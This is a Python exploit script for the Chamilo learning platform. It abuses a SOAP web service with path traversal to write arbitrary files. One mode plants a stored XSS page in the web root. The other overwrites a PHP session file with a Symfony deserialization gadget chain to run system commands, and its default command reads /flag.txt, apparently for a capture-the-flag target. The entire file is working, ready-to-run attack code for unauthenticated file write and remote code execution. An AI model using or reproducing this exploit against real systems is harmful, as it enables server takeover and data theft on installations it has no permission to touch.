import argparse
import base64
import random
import string
import subprocess
import requests

PHP_SERIALISED_PAYLOAD_GENERATOR = r'''
/*
    Uses the modified ambionics/phpggc's Symfony/RCE11 gadget chain found at:
    https://github.com/ambionics/phpggc/pull/155/files
*/

namespace Symfony\Component\Security\Core\Authentication\Token {
    class AnonymousToken implements \Serializable
    {
        public $parentData;

        public function __construct($parentData)
        {
            $this->parentData = $parentData;
        }

        public function serialize()
        {
            return serialize([null, $this->parentData]);
        }

        public function unserialize($serialized)
        {
        }
    }
}

namespace Symfony\Component\Validator {
    class ConstraintViolationList
    {
        private $violations;

        public function __construct($violations)
        {
            $this->violations = $violations;
        }
    }
}

namespace Symfony\Component\Finder\Iterator
{
    class SortableIterator
    {
        private $iterator;
        private $sort;

        function __construct($iterator, $sort)
        {
            $this->iterator = $iterator;
            $this->sort = $sort;
        }
    }
}

/*
    Generate the session file contents
*/
namespace {
    $args = array_slice($argv, 1);
    if (count($args) < 2) {
        $args = ["system", "cat /flag.txt"];
    }
    $a = new \Symfony\Component\Validator\ConstraintViolationList($args);
    $b = new \Symfony\Component\Finder\Iterator\SortableIterator($a, "call_user_func");
    $c = new \Symfony\Component\Validator\ConstraintViolationList($b);
    $d = new \Symfony\Component\Security\Core\Authentication\Token\AnonymousToken($c);

    session_start();
    $_SESSION["_"] = $d;
    echo base64_encode(session_encode()), "\n";
}
'''.strip()

SOAP_REQUEST_TEMPLATE = '''<?xml version="1.0" encoding="UTF-8"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="{url}" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:ns2="http://xml.apache.org/xml-soap" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><ns1:wsConvertPpt><param0 xsi:type="ns2:Map"><item><key xsi:type="xsd:string">file_data</key><value xsi:type="xsd:string">{file_data}</value></item><item><key xsi:type="xsd:string">file_name</key><value xsi:type="xsd:string">{file_path}</value></item><item><key xsi:type="xsd:string">service_ppt2lp_size</key><value xsi:type="xsd:string">720x540</value></item></param0></ns1:wsConvertPpt></SOAP-ENV:Body></SOAP-ENV:Envelope>
'''

def xss(args):
    '''
    Based on Chamilo's security hardening guide at: https://11.chamilo.org/documentation/security.html#5.Files-permissions
    The following directories in web root must be writable by webserver:
    - app/cache/
    - app/courses/
    - app/home/
    - app/logs/
    - app/upload/
    - main/default_course_document/images/
    '''

    file_path = ''.join([
        '../../../../', # in default config, traverse up 4 times to reach web root 
        args.file
    ])

    file_data = base64.b64encode(args.payload.encode('latin-1')).decode('latin-1')

    data = SOAP_REQUEST_TEMPLATE.format(url=args.url, file_path=file_path, file_data=file_data)

    try:
        response = requests.post(f'{args.url}/main/webservices/additional_webservices.php', data=data, headers={'Content-Type': 'application/xml'})
        print(f'Writing to {args.file} in web root directory')

        if '../' in args.file:
            print('[!] Unable to verify arbitrary file write remotely if writing to outside of web root.')
            return False

        xss_url = f'{args.url}/{args.file.lstrip("/")}'
        response = requests.get(xss_url)
        print(f'Checking if writing of file to {args.file} can be found at: {xss_url}')
        return response.text == args.payload
    except:
        return False

def rce(args):
    session_id_charset = string.ascii_letters + string.digits
    session_id = ''.join(random.choice(session_id_charset) for i in range(32))

    session_file_path = ''.join([
        '../../../../',                    # in default config, traverse up 4 times to reach web root 
        "../" * args.web_root.count("/"),  # traverse up to /
        args.session_directory.strip("/"), # go into directory containing session files
        f'/sess_{session_id}',              # session file name
    ])

    print(f'Overwriting session file at: {session_file_path}')

    proc = subprocess.Popen(['php', '-r', 'eval(file_get_contents("php://stdin"));'] + args.payload, shell=False, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    session_deserialisation_payload = proc.communicate(input=PHP_SERIALISED_PAYLOAD_GENERATOR.encode('latin-1'))[0].decode('latin-1').strip()

    data = SOAP_REQUEST_TEMPLATE.format(url=args.url, file_path=session_file_path, file_data=session_deserialisation_payload)

    try:
        response = requests.post(f'{args.url}/main/webservices/additional_webservices.php', data=data, headers={'Content-Type': 'application/xml'})

        print(f'Setting {args.sid}={session_id}')
        response = requests.get(f'{args.url}/', cookies={args.sid: session_id})

        print(f'Invoking {args.payload[0]}() with arguments: {", ".join(args.payload[1:])}')
        data = response.text.split('<!DOCTYPE html>', maxsplit=1)[0]
        print(f'Found data:\n{data}')
        return len(data) != 0
    except:
        return False

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', help='Url of your Chamilo', required=True)
    parser.add_argument('-r', '--web-root', help='Specify web root (default: /var/www/chamilo/)', type=str, default='/var/www/chamilo/')

    exploit_subparsers = parser.add_subparsers(title='exploit', dest='exploit', required=True)

    xss_subparser = exploit_subparsers.add_parser('xss', help='XSS in web root')
    xss_subparser.add_argument('-f', '--file', help='File to write to (relative to web root directory)', type=str, default='main/default_course_document/images/pwned.html')
    xss_subparser.add_argument('-p', '--payload', help='Contents of the file', type=str, default='<script>alert(document.domain)</script>')

    rce_subparser = exploit_subparsers.add_parser('rce', help='RCE via session file deserialisation')
    rce_subparser.add_argument('-sd', '--session-directory', help='Specify session directory (default: /tmp/)', type=str, default='/tmp/')
    rce_subparser.add_argument('-sid', '--sid', help='Specify session ID cookie name (default: ch_sid)', type=str, default='ch_sid')
    rce_subparser.add_argument('-p', '--payload', help='Space-delimited PHP function and arguments to execute (default: system cat /flag.txt)', type=str, nargs='*', default=['system', 'cat /flag.txt'])

    args = parser.parse_args()

    exploits = {
        'xss': xss,
        'rce': rce
    }

    exploit = exploits[args.exploit]

    if exploit(args):
        print(f'URL vulnerable: {args.url}')
    else:
        print(f'URL not vulnerable: {args.url}')

if __name__ == '__main__':
    main()